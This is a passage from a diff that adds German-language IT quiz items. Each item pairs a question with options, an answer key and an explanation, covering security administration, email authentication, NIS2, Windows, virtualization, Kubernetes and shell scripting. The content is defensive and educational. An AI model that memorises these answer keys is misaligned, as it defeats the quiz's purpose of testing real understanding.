+      "Ein fehlgeschlagener Angriff, weil der Status 200 lautet"
+    ],
+    "a": "Eine SQL-Injection, die vermutlich Daten ausgelesen hat",
+    "exp": "Die Eingabe hebelt die Bedingung der SQL-Abfrage aus. Status 200 und die viel größere Antwort sprechen dafür, dass mehr Datensätze als üblich ausgeliefert wurden. Man behandelt das als Vorfall und prüft, welche Daten betroffen sind."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Admin entdeckt auf einem Server eine Hintertür und löscht sie sofort. Das kompromittierte Adminkonto und der Zugang des Angreifers bleiben aber unverändert. Was ist der Fehler?",
+    "options": [
+      "Die Eindämmung fehlt, der Angreifer kann jederzeit zurückkehren",
+      "Kein Fehler, das Löschen der Hintertür beendet den Vorfall",
+      "Die Hintertür hätte zuerst auf andere Server kopiert werden müssen",
+      "Der Server hätte vorher auf die neueste Version aktualisiert werden müssen"
+    ],
+    "a": "Die Eindämmung fehlt, der Angreifer kann jederzeit zurückkehren",
+    "exp": "Solange der Angreifer gültige Zugangsdaten und Zugangswege hat, legt er neue Hintertüren an. Zuerst werden deshalb Konten gesperrt, Kennwörter getauscht und Zugänge geschlossen. Erst danach bringt die Beseitigung dauerhaft etwas."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein mittelständisches Unternehmen führt ein SIEM ein und kann zunächst nur wenige Logquellen anbinden. Welche Auswahl bringt den größten Nutzen?",
+    "options": [
+      "Domänencontroller, Firewall, VPN-Gateway und EDR",
+      "Drucker, Telefonanlage, Kaffeeautomat und Zeiterfassung",
+      "Nur die Clients der Buchhaltung mit allen Anwendungslogs",
+      "Nur die Webserverlogs der öffentlichen Firmenwebseite"
+    ],
+    "a": "Domänencontroller, Firewall, VPN-Gateway und EDR",
+    "exp": "Anmeldungen, Netzübergänge, Fernzugänge und Endpunkte zeigen die meisten Angriffe. Mit diesen Quellen lassen sich Spraying, Einbrüche über VPN und Schadsoftware erkennen. Weitere Quellen kommen schrittweise hinzu."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Bei der Strukturanalyse nach IT-Grundschutz erfassen Sie 60 gleich konfigurierte Büro-PCs mit demselben Zweck und Schutzbedarf. Wie gehen Sie vor?",
+    "options": [
+      "Die PCs zu einer Gruppe als ein Zielobjekt zusammenfassen",
+      "Jeden PC einzeln mit allen Bausteinen modellieren",
+      "Die PCs weglassen, weil sie keine Server sind",
+      "Nur einen zufälligen PC erfassen und den Rest ignorieren"
+    ],
+    "a": "Die PCs zu einer Gruppe als ein Zielobjekt zusammenfassen",
+    "exp": "Gleichartige Objekte mit gleicher Konfiguration, Nutzung und gleichem Schutzbedarf dürfen gruppiert werden. Das reduziert den Aufwand erheblich. Weicht ein Gerät ab, etwa der PC der Geschäftsführung, wird es gesondert erfasst."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein kleines Unternehmen startet mit der Basis-Absicherung nach IT-Grundschutz. Welche Anforderungen setzt es zuerst um?",
+    "options": [
+      "Die Basis-Anforderungen der Bausteine, erkennbar am Wort MUSS",
+      "Nur die Anforderungen für erhöhten Schutzbedarf",
+      "Nur die Standard-Anforderungen, erkennbar am Wort SOLLTE",
+      "Beliebige Anforderungen, solange es insgesamt die Hälfte sind"
+    ],
+    "a": "Die Basis-Anforderungen der Bausteine, erkennbar am Wort MUSS",
+    "exp": "Die Basis-Absicherung setzt zunächst die Basis-Anforderungen um, die als Mindestschutz vorrangig sind. Später folgen die Standard-Anforderungen. Anforderungen für erhöhten Schutzbedarf kommen erst mit der Kern- oder Standard-Absicherung ins Spiel."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Die Backups laufen seit zwei Jahren ohne Fehlermeldung. Eine Wiederherstellung wurde nie ausprobiert. Was empfehlen Sie?",
+    "options": [
+      "Regelmäßige Wiederherstellungstests mit Zeitmessung und Protokoll",
+      "Nichts, weil fehlerfreie Jobs die Lesbarkeit beweisen",
+      "Die Backups zusätzlich doppelt so oft ausführen",
+      "Die Backupsoftware jedes Jahr gegen ein neues Produkt tauschen"
+    ],
+    "a": "Regelmäßige Wiederherstellungstests mit Zeitmessung und Protokoll",
+    "exp": "Ein erfolgreicher Sicherungsjob sagt nichts darüber, ob sich Daten tatsächlich und rechtzeitig zurückholen lassen. Nur ein Test zeigt, ob Datenträger, Schlüssel und Anleitung stimmen und ob die RTO erreichbar ist. Ergebnisse fließen ins Notfallhandbuch ein."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein externer Dienstleister braucht für ein Datenbankupdate an einem Tag Adminrechte auf einem Server. Wie richten Sie den Zugang ein?",
+    "options": [
+      "Persönliches, befristetes Konto nur für diesen Server, mit Protokoll",
+      "Das gemeinsame Administratorkonto mit dem Dienstleister teilen",
+      "Ein dauerhaftes Konto in der Gruppe Domänen-Admins anlegen",
+      "Das Konto eines internen Admins samt Kennwort weitergeben"
+    ],
+    "a": "Persönliches, befristetes Konto nur für diesen Server, mit Protokoll",
+    "exp": "Ein persönliches Konto macht Handlungen nachvollziehbar, die Befristung schließt den Zugang automatisch. Die Rechte beschränken sich auf das eine System. Oft wird die Sitzung zusätzlich über einen Jump Host aufgezeichnet."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Eine Auszubildende hat in drei Jahren Einkauf, Vertrieb und Buchhaltung durchlaufen. Sie hat heute noch Zugriff auf die Ordner aller drei Abteilungen. Welcher Prozess fehlt?",
+    "options": [
+      "Beim Abteilungswechsel die alten Rechte entziehen (Mover-Prozess)",
+      "Eine jährliche Kennwortänderung für alle Auszubildenden",
+      "Eine zusätzliche Freigabe auf die Ordner der Geschäftsführung",
+      "Ein eigenes Postfach für jede durchlaufene Abteilung"
+    ],
+    "a": "Beim Abteilungswechsel die alten Rechte entziehen (Mover-Prozess)",
+    "exp": "Im Lebenszyklus Eintritt, Wechsel und Austritt werden Rechte bei jedem Wechsel an die neue Rolle angepasst. Sonst sammeln sich Berechtigungen an, die niemand mehr braucht. Regelmäßige Rezertifizierungen fangen übersehene Fälle ab."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Nach dem Hinzufügen eines weiteren Clouddienstes meldet die SPF-Prüfung von firma.de \"permerror\". Der Eintrag enthält nun zwölf include-Angaben. Was ist die Ursache?",
+    "options": [
+      "Die Grenze von zehn DNS-Abfragen pro SPF-Prüfung ist überschritten",
+      "SPF-Einträge dürfen höchstens drei include-Angaben enthalten",
+      "Clouddienste dürfen nicht per include eingebunden werden",
+      "Der Eintrag endet mit -all statt mit ~all"
+    ],
+    "a": "Die Grenze von zehn DNS-Abfragen pro SPF-Prüfung ist überschritten",
+    "exp": "Jedes include, a, mx und redirect kostet mindestens eine DNS-Abfrage, verschachtelte Einträge zählen mit. Ab der elften Abfrage bricht die Prüfung mit Permerror ab. Man entfernt ungenutzte Dienste oder ersetzt Einträge durch feste IP-Bereiche."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Unternehmen will DMARC einführen, kennt aber nicht alle Systeme, die in seinem Namen Mails versenden. Wie beginnt es sinnvoll?",
+    "options": [
+      "Mit p=none und Berichtsadresse (rua), dann schrittweise verschärfen",
+      "Sofort mit p=reject, damit Fälschungen direkt blockiert werden",
+      "Ohne DNS-Eintrag, nur mit einer Regel im eigenen Mailserver",
+      "Mit p=quarantine für alle Mails, auch die eigenen"
+    ],
+    "a": "Mit p=none und Berichtsadresse (rua), dann schrittweise verschärfen",
+    "exp": "Mit p=none werden keine Mails abgewiesen, aber die Empfänger schicken Auswertungen. Daraus erkennt man vergessene Absender wie Shopsysteme oder Scanner. Erst wenn alle sauber SPF oder DKIM bestehen, folgen quarantine und reject."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Mails von firma.de werden über den Verteiler eines Vereins weitergeleitet. Beim Endempfänger schlägt SPF fehl, DMARC besteht trotzdem. Wie ist das möglich?",
+    "options": [
+      "Die DKIM-Signatur von firma.de blieb bei der Weiterleitung gültig",
+      "SPF wird bei weitergeleiteten Mails grundsätzlich nicht geprüft",
+      "DMARC wertet nur das Ergebnis der Rückwärtsauflösung aus",
+      "Der Verteiler hat eine neue SPF-Freigabe für firma.de erstellt"
+    ],
+    "a": "Die DKIM-Signatur von firma.de blieb bei der Weiterleitung gültig",
+    "exp": "Bei einer Weiterleitung sendet ein fremder Server, deshalb passt die IP nicht mehr zum SPF-Eintrag. Eine DKIM-Signatur hängt dagegen am Inhalt und übersteht die Weiterleitung, solange nichts verändert wird. Für DMARC reicht ein ausgerichtetes Verfahren."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "In der Sicherheitsgruppe einer Cloud-Datenbank-VM steht \"eingehend TCP 5432 von 0.0.0.0/0 erlauben\". Welche Änderung ist richtig?",
+    "options": [
+      "Die Quelle auf die Adressen der Anwendungsserver oder des VPN beschränken",
+      "Die Regel lassen und nur den Port auf 15432 ändern",
+      "Die Quelle auf 0.0.0.0/32 ändern, damit sie enger ist",
+      "Die Regel lassen, weil PostgreSQL immer ein Kennwort verlangt"
+    ],
+    "a": "Die Quelle auf die Adressen der Anwendungsserver oder des VPN beschränken",
+    "exp": "0.0.0.0/0 bedeutet das gesamte Internet, die Datenbank wird damit weltweit angreifbar. Datenbanken sind nur für die Anwendungsserver oder Admins über VPN erreichbar. Ein anderer Port hält automatische Scanner kaum auf."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Unternehmen nutzt eine verwaltete Datenbank als PaaS beim Cloudanbieter. Wofür bleibt es nach dem Modell der geteilten Verantwortung selbst zuständig?",
+    "options": [
+      "Für Zugriffsrechte, Netzfreigaben und die gespeicherten Daten",
+      "Für die Patches des Datenbankprogramms und des Betriebssystems",
+      "Für die Stromversorgung und Kühlung im Rechenzentrum",
+      "Für den Austausch defekter Festplatten im Speichersystem"
+    ],
+    "a": "Für Zugriffsrechte, Netzfreigaben und die gespeicherten Daten",
+    "exp": "Bei PaaS betreibt und patcht der Anbieter Plattform und Datenbanksoftware. Wer zugreifen darf, welche Netze freigegeben sind und welche Daten gespeichert werden, entscheidet weiter der Kunde. Fehlkonfigurationen in diesem Bereich sind eine häufige Ursache von Datenlecks."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Die Backups der Cloud-Server liegen im selben Cloudkonto wie die Server, mit denselben Admins. Warum ist das bei einem Angriff riskant?",
+    "options": [
+      "Wer das Konto übernimmt, kann Server und Backups zugleich löschen",
+      "Backups im selben Konto sind langsamer wiederherzustellen",
+      "Der Anbieter berechnet für eigene Backups doppelte Gebühren",
+      "Backups dürfen in der Cloud nur verschlüsselt geteilt werden"
+    ],
+    "a": "Wer das Konto übernimmt, kann Server und Backups zugleich löschen",
+    "exp": "Angreifer löschen gezielt Sicherungen, bevor sie verschlüsseln. Deshalb gehören Backups in ein getrenntes Konto oder zu einem anderen Anbieter, mit eigenen Zugangsdaten. Unveränderbarer Speicher (Object Lock) schützt zusätzlich vor dem Löschen."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Eine NIS2-Einrichtung erkennt am Freitagabend einen erheblichen Sicherheitsvorfall. Was muss die erste Meldung an das BSI innerhalb von 24 Stunden enthalten?",
+    "options": [
+      "Eine Frühwarnung zu Angriffsverdacht und Folgen im Ausland",
+      "Einen vollständigen Abschlussbericht mit allen Ursachen",
+      "Die Namen aller Mitarbeiter, die den Vorfall bemerkt haben",
+      "Eine Kostenaufstellung aller Schäden durch die Versicherung"
+    ],
+    "a": "Eine Frühwarnung zu Angriffsverdacht und Folgen im Ausland",
+    "exp": "Die Frühwarnung soll schnell ein erstes Lagebild geben, auch wenn vieles noch unklar ist. Innerhalb von 72 Stunden folgt die Meldung mit erster Bewertung und Indikatoren. Der Abschlussbericht kommt spätestens einen Monat später."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Unternehmen unter NIS2 lässt seine Server von einem IT-Dienstleister per Fernwartung betreuen. Was verlangt die Pflicht zur Sicherheit der Lieferkette?",
+    "options": [
+      "Sicherheitsanforderungen an den Dienstleister festlegen und deren Einhaltung prüfen",
+      "Den Dienstleister nur nach dem niedrigsten Stundensatz auswählen",
+      "Die Verantwortung für Vorfälle vollständig auf den Dienstleister abwälzen",
+      "Die Fernwartung verbieten und alle Aufgaben selbst erledigen"
+    ],
+    "a": "Sicherheitsanforderungen an den Dienstleister festlegen und deren Einhaltung prüfen",
+    "exp": "Über Dienstleister mit Fernzugang wurden viele Angriffe möglich. Das Unternehmen regelt deshalb vertraglich etwa MFA, Protokollierung, Meldewege und Prüfrechte. Die Verantwortung für die eigene Sicherheit bleibt trotzdem bei ihm."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein erzwungenes GPO an der Domäne aktiviert die Bildschirmsperre nach 10 Minuten. Ein GPO an der OU Technik deaktiviert die Bildschirmsperre. Welche Einstellung gilt für Rechner in Technik?",
+    "options": [
+      "Die Einstellung des erzwungenen Domänen-GPOs",
+      "Die Einstellung des GPOs an der OU Technik",
+      "Keine, weil sich beide Einstellungen aufheben",
+      "Die Einstellung des zuletzt geänderten GPOs"
+    ],
+    "a": "Die Einstellung des erzwungenen Domänen-GPOs",
+    "exp": "Normalerweise gewinnt das GPO, das näher an der OU liegt, weil es zuletzt verarbeitet wird. Ein erzwungenes GPO lässt sich aber von untergeordneten GPOs nicht überschreiben. Es gilt deshalb die Einstellung aus dem Domänen-GPO."
+  },
+  {
+    "cat": "systeme",
+    "q": "Für einen neuen Fileserver soll die Rechtevergabe übersichtlich bleiben. Welches Vorgehen gilt als bewährt?",
+    "options": [
+      "Freigabe großzügig für Authentifizierte Benutzer, Feinsteuerung über NTFS",
+      "Freigabe und NTFS jeweils einzeln pro Benutzer mit gleichen Rechten",
+      "Freigabe nur Lesen für alle, Schreiben über lokale Administratoren",
+      "NTFS für Jeder auf Vollzugriff, Feinsteuerung über die Freigabe"
+    ],
+    "a": "Freigabe großzügig für Authentifizierte Benutzer, Feinsteuerung über NTFS",
+    "exp": "Werden Rechte an zwei Stellen fein gepflegt, entstehen schnell Widersprüche. Üblich ist, die Freigabe weit zu öffnen und die eigentliche Steuerung mit NTFS über Gruppen vorzunehmen. NTFS wirkt auch beim lokalen Zugriff und ist feiner einstellbar."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Admin überlegt, die DNS-Zone firma.intern als AD-integrierte Zone statt als primäre Standardzone anzulegen. Welcher Vorteil spricht dafür?",
+    "options": [
+      "Replikation über AD und nur sichere dynamische Updates",
+      "Die Zone ist ohne Domänencontroller aus dem Internet erreichbar",
+      "Die Zone braucht keinen SOA- und keinen NS-Eintrag mehr",
+      "Die Clients benötigen keinen eingetragenen DNS-Server mehr"
+    ],
+    "a": "Replikation über AD und nur sichere dynamische Updates",
+    "exp": "Eine AD-integrierte Zone liegt in der AD-Datenbank und wird mit ihr auf die Domänencontroller repliziert. Jeder dieser DNS-Server kann Änderungen annehmen. Außerdem lassen sich nur sichere dynamische Updates zulassen, sodass nur authentifizierte Rechner Einträge anlegen."
+  },
+  {
+    "cat": "systeme",
+    "q": "Die Live-Migration einer VM von einem älteren auf einen neu gekauften Hyper-V-Host bricht mit einem Prozessorfehler ab. Beide Hosts haben Intel-CPUs verschiedener Generationen. Was hilft?",
+    "options": [
+      "Die Prozessorkompatibilität der VM aktivieren",
+      "Der VM zusätzliche virtuelle Prozessoren zuweisen",
+      "Den dynamischen Arbeitsspeicher der VM abschalten",
+      "Die VM vor der Migration in einen Snapshot versetzen"
+    ],
+    "a": "Die Prozessorkompatibilität der VM aktivieren",
+    "exp": "Neuere CPUs bieten Befehlssätze, die ältere nicht kennen. Die Prozessorkompatibilität blendet diese für die VM aus, sodass sie auf beiden Hosts laufen kann. Die Einstellung erfordert ein Herunterfahren der VM, bei VMware heißt die Funktion EVC."
+  },
+  {
+    "cat": "systeme",
+    "q": "Eine VM mit 4 vCPUs läuft auf einem ausgelasteten Host. Nach der Erhöhung auf 16 vCPUs ist sie langsamer als vorher. Was ist eine typische Erklärung?",
+    "options": [
+      "Die VM wartet länger, bis viele physische Kerne gleichzeitig frei sind",
+      "Die VM verliert beim Erhöhen ihren reservierten Arbeitsspeicher",
+      "Mehr als acht vCPUs werden vom Gastsystem nicht unterstützt",
+      "Der Hypervisor drosselt große VMs automatisch auf halbe Leistung"
+    ],
+    "a": "Die VM wartet länger, bis viele physische Kerne gleichzeitig frei sind",
+    "exp": "Der Hypervisor muss für jede vCPU Rechenzeit auf physischen Kernen einplanen. Je mehr vCPUs eine VM hat, desto schwerer wird das auf einem vollen Host, die Wartezeit (CPU Ready) steigt. Man vergibt deshalb nur so viele vCPUs, wie die Anwendung wirklich nutzt."
+  },
+  {
+    "cat": "systeme",
+    "q": "Eine Anwendung in Kubernetes braucht eine Konfigurationsdatei und ein Datenbankpasswort. Wo legen Sie beides sinnvoll ab?",
+    "options": [
+      "Die Konfiguration in einer ConfigMap, das Passwort in einem Secret",
+      "Beides fest im Container-Image, damit es immer vorhanden ist",
+      "Beides als Kommentar in der YAML-Datei des Deployments",
+      "Die Konfiguration in einem Secret, das Passwort im Pod-Namen"
+    ],
+    "a": "Die Konfiguration in einer ConfigMap, das Passwort in einem Secret",
+    "exp": "ConfigMaps trennen Konfiguration vom Image, sodass ein Image in mehreren Umgebungen läuft. Secrets sind für vertrauliche Daten gedacht und können gezielter geschützt werden. Standardmäßig sind Secrets nur Base64-kodiert, deshalb gehört Verschlüsselung im Cluster dazu."
+  },
+  {
+    "cat": "systeme",
+    "q": "kubectl get pods zeigt bei einem Pod den Status CrashLoopBackOff. Womit beginnen Sie die Fehlersuche?",
+    "options": [
+      "Mit kubectl logs für den Pod, bei Bedarf mit --previous",
+      "Mit kubectl delete namespace für den betroffenen Namespace",
+      "Mit einem Neustart aller Knoten des Kubernetes-Clusters",
+      "Mit kubectl scale auf null Replikate und zurück auf drei"
+    ],
+    "a": "Mit kubectl logs für den Pod, bei Bedarf mit --previous",
+    "exp": "CrashLoopBackOff bedeutet, dass der Container startet, abstürzt und immer wieder neu gestartet wird. Die Ursache steht meist in der Ausgabe der Anwendung. kubectl logs zeigt sie, mit --previous auch die des abgestürzten Laufs. kubectl describe pod liefert zusätzlich die Ereignisse."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein neues iSCSI-SAN wird an drei Virtualisierungshosts angebunden. Welche Maßnahmen schützen den Speicherzugriff?",
+    "options": [
+      "Ein getrenntes Storage-Netz und CHAP-Authentifizierung",
+      "Ein Portforwarding am Router und ein starkes Admin-Passwort",
+      "Ein gemeinsames Netz mit Clients und aktivem DHCP-Snooping",
+      "Ein Gastzugang am SAN und deaktivierte Firewall auf den Hosts"
+    ],
+    "a": "Ein getrenntes Storage-Netz und CHAP-Authentifizierung",
+    "exp": "iSCSI überträgt Blockdaten meist unverschlüsselt über Ethernet. Ein eigenes VLAN oder physisches Netz trennt den Verkehr von Clients. Mit CHAP muss sich der Initiator am Target anmelden, zusätzlich beschränkt man die LUN auf die IQNs der Hosts."
+  },
+  {
+    "cat": "systeme",
+    "q": "In einem Proxmox-Cluster mit drei Knoten soll eine wichtige VM bei Ausfall ihres Hosts automatisch auf einem anderen Knoten starten. Die Platte der VM liegt auf dem lokalen LVM des Hosts. Was fehlt für HA?",
+    "options": [
+      "Ein gemeinsamer oder replizierter Speicher, z.B. Ceph, NFS oder ZFS-Replikation",
+      "Ein zweiter Corosync-Ring zwischen allen drei Knoten des Clusters",
+      "Ein aktueller Snapshot der VM auf dem lokalen Speicher des Hosts",
+      "Eine feste IP-Adresse der VM, die auf allen Knoten eingetragen ist"
+    ],
+    "a": "Ein gemeinsamer oder replizierter Speicher, z.B. Ceph, NFS oder ZFS-Replikation",
+    "exp": "Fällt ein Host aus, ist sein lokaler Speicher für die anderen Knoten nicht erreichbar. Proxmox HA kann die VM nur neu starten, wenn ihre Platte auch auf dem Zielknoten verfügbar ist. Bei ZFS-Replikation gehen dabei die Änderungen seit dem letzten Replikationslauf verloren."
+  },
+  {
+    "cat": "systeme",
+    "q": "Der Service Desk löst seit Wochen fast täglich dasselbe Ticket: Der Druckserver hängt und wird neu gestartet. Welcher ITIL-Prozess sollte jetzt übernehmen?",
+    "options": [
+      "Problem Management, um die Ursache zu finden",
+      "Service Level Management, um die Lösungszeit zu verlängern",
+      "Change Management, um den Neustart zu genehmigen",
+      "Request Fulfilment, um den Neustart als Standardanfrage zu führen"
+    ],
+    "a": "Problem Management, um die Ursache zu finden",
+    "exp": "Das Incident Management stellt den Betrieb schnell wieder her, beseitigt aber nicht die Ursache. Wiederkehrende Störungen fasst man zu einem Problem zusammen. Das Problem Management sucht die Ursache und dokumentiert bis zur Lösung einen Workaround als Known Error."
+  },
+  {
+    "cat": "systeme",
+    "q": "Während eines genehmigten Changes im Wartungsfenster startet der Mailserver nach dem Update nicht mehr, das Fenster endet in 30 Minuten. Was tun Sie?",
+    "options": [
+      "Den im Change dokumentierten Rückfallplan ausführen",
+      "Das Wartungsfenster eigenmächtig um einige Stunden verlängern",
+      "Den Fehler erst am nächsten Morgen als Incident melden",
+      "Ein weiteres ungetestetes Update installieren und neu starten"
+    ],
+    "a": "Den im Change dokumentierten Rückfallplan ausführen",
+    "exp": "Jeder Change braucht einen Rückfallplan, z.B. das Zurückspielen eines Snapshots oder Backups. Ist der Erfolg im Fenster nicht mehr erreichbar, stellt man den alten Zustand her. Danach wird der Fehlschlag dokumentiert und der Change neu geplant."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Switch wird im Monitoring als nicht erreichbar gemeldet, SNMP-Abfragen laufen in einen Timeout. Ein Ping auf den Switch funktioniert. Was prüfen Sie zuerst?",
+    "options": [
+      "SNMP-Zugangsdaten und die SNMP-Zugriffsliste auf dem Switch",
+      "Die Verkabelung zwischen Switch und Monitoring-Server",
+      "Die Spanning-Tree-Priorität des betroffenen Switches",
+      "Die Lease-Zeit des DHCP-Servers im Management-VLAN"
+    ],
+    "a": "SNMP-Zugangsdaten und die SNMP-Zugriffsliste auf dem Switch",
+    "exp": "Da der Ping klappt, ist das Gerät im Netz erreichbar. Bei SNMP-Timeouts passen oft Community bzw. SNMPv3-Benutzer nicht, oder eine Zugriffsliste erlaubt den Monitoring-Server nicht. Auch eine Firewall, die UDP 161 sperrt, führt zu diesem Bild."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Skript soll deaktivierte Konten finden: Get-ADUser -Filter * | Where-Object { $_.Enabled = $false }. Es liefert keine Ergebnisse, obwohl es deaktivierte Konten gibt. Wo liegt der Fehler?",
+    "options": [
+      "Im Vergleich steht = statt -eq",
+      "Where-Object erwartet runde statt geschweifte Klammern",
+      "$false muss in Anführungszeichen stehen",
+      "Enabled ist keine Eigenschaft von Get-ADUser"
+    ],
+    "a": "Im Vergleich steht = statt -eq",
+    "exp": "In PowerShell ist = eine Zuweisung, verglichen wird mit -eq. Die Zuweisung gibt nichts zurück, deshalb lässt Where-Object kein Objekt durch. Richtig ist { $_.Enabled -eq $false }."
+  },
+  {
+    "cat": "systeme",
+    "q": "In einem PowerShell-Skript steht if ($frei > 10) { Write-Host \"genug Platz\" }. Danach liegt im Arbeitsverzeichnis eine neue Datei namens 10. Was ist passiert?",
+    "options": [
+      "> hat die Ausgabe in eine Datei umgeleitet, zum Vergleich dient -gt",
+      "> hat den Wert 10 in die Variable $frei geschrieben",
+      "PowerShell legt bei jedem if eine Protokolldatei an",
+      "Write-Host schreibt seine Ausgabe immer in eine Datei"
+    ],
+    "a": "> hat die Ausgabe in eine Datei umgeleitet, zum Vergleich dient -gt",
+    "exp": "In PowerShell ist > der Umleitungsoperator wie in anderen Shells. Der Inhalt von $frei landet in der Datei 10, die Bedingung ist leer und damit falsch. Für größer als verwendet man -gt, für kleiner als -lt."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Skript kopiert Dateien mit try { Copy-Item $quelle $ziel } catch { Write-Host \"Fehler\" }. Fehlt eine Quelldatei, erscheint die rote Fehlermeldung, der catch-Block läuft aber nicht. Warum?",
+    "options": [
+      "Der Fehler bricht nicht ab, nötig ist -ErrorAction Stop",
+      "catch greift nur, wenn hinter dem Block finally steht",
+      "try und catch funktionieren nur in Funktionen, nicht in Skripten",
+      "Copy-Item meldet fehlende Dateien grundsätzlich nicht als Fehler"
+    ],
+    "a": "Der Fehler bricht nicht ab, nötig ist -ErrorAction Stop",
+    "exp": "Viele Cmdlets melden Fehler als nicht abbrechend und machen weiter. catch fängt nur abbrechende Fehler. Mit -ErrorAction Stop am Cmdlet oder $ErrorActionPreference = 'Stop' wird daraus ein abbrechender Fehler."
+  },
+  {
+    "cat": "systeme",
+    "q": "In einer Domäne mit 30.000 Konten dauert Get-ADUser -Filter * | Where-Object { $_.Department -eq 'Einkauf' } sehr lange. Wie wird die Abfrage schneller?",
+    "options": [
+      "Mit Get-ADUser -Filter \"Department -eq 'Einkauf'\" -Properties Department",
+      "Mit Get-ADUser -Filter * | Sort-Object Department | Select-Object -First 1",
+      "Mit Get-ADUser -Filter * | Where-Object Department | Out-GridView",
+      "Mit Get-ADUser -Filter * -Properties * | Where-Object Department"
+    ],
+    "a": "Mit Get-ADUser -Filter \"Department -eq 'Einkauf'\" -Properties Department",
+    "exp": "Bei Where-Object überträgt der Domänencontroller zuerst alle Konten, gefiltert wird erst auf dem Client. Mit -Filter wertet der Domänencontroller die Bedingung selbst aus und schickt nur die Treffer. Diese Regel heißt auch: so früh wie möglich filtern."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Kollege schreibt Get-Service | Format-Table Name, Status | Export-Csv dienste.csv. Die CSV enthält nur seltsame Einträge statt Dienstnamen. Was ist falsch?",
+    "options": [
+      "Format-Table erzeugt Formatobjekte, zum Auswählen dient Select-Object",
+      "Export-Csv kann Dienstobjekte grundsätzlich nicht ausgeben",
+      "Format-Table sortiert die Spalten in umgekehrter Reihenfolge",
+      "Get-Service muss vorher mit Get-Member umgewandelt werden"
+    ],
+    "a": "Format-Table erzeugt Formatobjekte, zum Auswählen dient Select-Object",
+    "exp": "Format-Cmdlets sind nur für die Anzeige am Bildschirm gedacht. Sie ersetzen die Objekte durch Formatierungsanweisungen, die Export-Csv dann ausgibt. Wer Spalten auswählen und weiterverarbeiten will, nimmt Select-Object und formatiert höchstens ganz am Ende."
+  },
+  {
+    "cat": "systeme",
+    "q": "In einem Bash-Skript steht rsync -a /daten /backup | tee -a sync.log und danach if [ $? -ne 0 ]; then echo Fehler; fi. Warum meldet es nie einen Fehler?",
+    "options": [
+      "$? enthält den Rückgabewert von tee, nicht den von rsync",
+      "$? ist in if-Abfragen der Bash grundsätzlich immer leer",
+      "tee unterdrückt alle Fehlermeldungen von rsync im Log",
+      "rsync liefert nur mit der Option -v einen Rückgabewert"
+    ],
+    "a": "$? enthält den Rückgabewert von tee, nicht den von rsync",
+    "exp": "Bei einer Pipe gibt $? den Rückgabewert des letzten Befehls zurück, hier tee. Mit set -o pipefail liefert die Pipe einen Fehlercode, sobald ein Befehl darin fehlschlägt. Alternativ steht der Wert von rsync in ${PIPESTATUS[0]}."
+  },
+  {
+    "cat": "systeme",
+    "q": "Sie wollen auf einem Linux-Server schnell zählen, wie viele fehlgeschlagene SSH-Anmeldungen in der aktuellen auth.log stehen. Welcher Befehl passt?",
+    "options": [
+      "grep \"Failed password\" /var/log/auth.log | wc -l",
+      "cat /var/log/auth.log | wc -l | grep \"Failed password\"",
+      "grep -v \"Failed password\" /var/log/auth.log | wc -l",
+      "tail -f /var/log/auth.log | grep -c \"Accepted\""
+    ],
+    "a": "grep \"Failed password\" /var/log/auth.log | wc -l",
+    "exp": "grep filtert die Zeilen mit dem Suchtext heraus, wc -l zählt sie. Gleichwertig ist grep -c \"Failed password\" datei. Auf Systemen ohne auth.log liefert journalctl -u ssh die Meldungen."
+  },
+  {
+    "cat": "systeme",
+    "q": "Was gibt awk -F: '$3 >= 1000 {print $1}' /etc/passwd auf einem Debian-Server aus?",
+    "options": [
+      "Die Namen der Benutzerkonten mit einer UID ab 1000",
+      "Die Heimatverzeichnisse aller Systemkonten",
+      "Die Gruppen, die mehr als 1000 Mitglieder haben",
+      "Die ersten 1000 Zeilen der Datei /etc/passwd"
+    ],
+    "a": "Die Namen der Benutzerkonten mit einer UID ab 1000",
+    "exp": "-F: setzt den Doppelpunkt als Trennzeichen. In /etc/passwd steht in Feld 1 der Name und in Feld 3 die UID. Bei Debian und Ubuntu beginnen normale Benutzerkonten bei UID 1000, Systemkonten liegen darunter."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Cronjob schreibt mit /opt/check.sh > /var/log/check.log seine Ergebnisse. Am Morgen steht im Log nur der letzte Lauf der Nacht. Was ändern Sie?",
+    "options": [
+      "> durch >> ersetzen, damit angehängt wird",
+      "> durch < ersetzen, damit die Datei gelesen wird",
+      "> durch | ersetzen, damit das Log weitergereicht wird",
+      "> durch 2> ersetzen, damit alle Läufe erhalten bleiben"
+    ],
+    "a": "> durch >> ersetzen, damit angehängt wird",
+    "exp": "> legt die Datei bei jedem Lauf neu an und überschreibt den alten Inhalt. >> hängt die Ausgabe an das Ende an. Damit das Log nicht endlos wächst, richtet man zusätzlich logrotate ein."
+  },
+  {
+    "cat": "systeme",
+    "q": "Ein Skript bricht in der Zeile ZIEL = /backup mit ZIEL: command not found ab. Was ist der Fehler?",
+    "options": [
+      "Um das Gleichheitszeichen dürfen bei der Zuweisung keine Leerzeichen stehen",
+      "Variablennamen müssen in der Bash kleingeschrieben werden",
+      "Pfade müssen bei Zuweisungen in eckigen Klammern stehen",
+      "Vor der Zuweisung muss das Schlüsselwort set stehen"
+    ],
+    "a": "Um das Gleichheitszeichen dürfen bei der Zuweisung keine Leerzeichen stehen",
